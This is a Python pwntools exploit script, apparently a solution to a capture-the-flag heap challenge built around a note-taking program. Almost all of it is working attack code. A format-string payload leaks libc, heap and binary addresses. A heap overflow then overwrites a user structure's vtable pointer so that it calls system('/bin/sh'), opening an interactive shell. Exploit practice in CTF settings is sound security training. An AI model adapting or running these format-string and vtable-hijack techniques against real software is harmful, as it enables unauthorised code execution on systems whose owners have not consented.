#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def conn():
    if args.LOCAL:
        r = exe.process()
    elif args.GDB:
        return gdb.debug(exe.process(), 
        gdbscript="""
        b *view_notes_impl
        continue
        """
        )
    else:
        r = remote("localhost", 1337)

    return r

def register(r, name):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Username: ", name)

def login(r, name):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"username: ", name)

def create_note(r, idx, content):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"index: ", str(idx).encode())
    r.sendafter(b"Content: ", content)

def edit_note(r, idx, content):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"index: ", str(idx).encode())
    r.sendlineafter(b"content: ", content)

def view_one(r, idx):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"index: ", str(idx).encode())

def view_all(r):
    r.sendlineafter(b"> ", b"4")

def logout(r):
    r.sendlineafter(b"> ", b"5")

def main():
    r = conn()

    register(r, b"aa")
    login(r, b"aa")
    create_note(r,0,b"%p"*30)
    view_one(r,0)
    r.recvuntil(b": ")

    leaks = r.recvline().decode().strip().replace("0x",".0x").replace("(nil)",".(nil).").replace("..",".").split(".")


    libc_leak = int(leaks[21],16)
    heap_leak = int(leaks[5],16)
    exe_base_leak = int(leaks[6],16)

    print("Libc Base: " + hex(libc_leak - 0x213580))
    print("Exe Base: " + hex(exe_base_leak - 0x1476))
    print("Heap Leak: " + hex(heap_leak))


    libc.address = libc_leak - 0x213580
    exe.address = exe_base_leak - 0x1476

    # --- EXPLOIT START ---
    
    # 1. Setup Victim Note
    logout(r)
    register(r, b"B")
    login(r, b"B")
    
    # Payload note contains /bin/sh and a pointer to system()
    fake_vtable_payload = b"/bin/sh\x00" + p64(libc.sym['system'])
    create_note(r, 0, fake_vtable_payload)
    
    # FIXED MATH: Distance from Note 0 content to Note 1 content is 0x80
    note_1_0_addr = heap_leak + 0x80 

    # 2. Perform Overflow
    logout(r)
    login(r, b"aa")

    overflow = b"A" * 64
    overflow += p64(0) + p64(0x31)        # User 1 chunk metadata
    overflow += b"B\x00".ljust(24, b"A") # User 1 name
    # vtable -> points to the 'system' pointer inside Note 1 (offset +8)
    overflow += p64(note_1_0_addr + 8) 

    edit_note(r, 0, overflow)

    # 3. Trigger
    logout(r)
    login(r, b"B")
    
    log.success("Triggering Shell...")
    view_one(r, 0)

    r.interactive()

if __name__ == "__main__":
    main()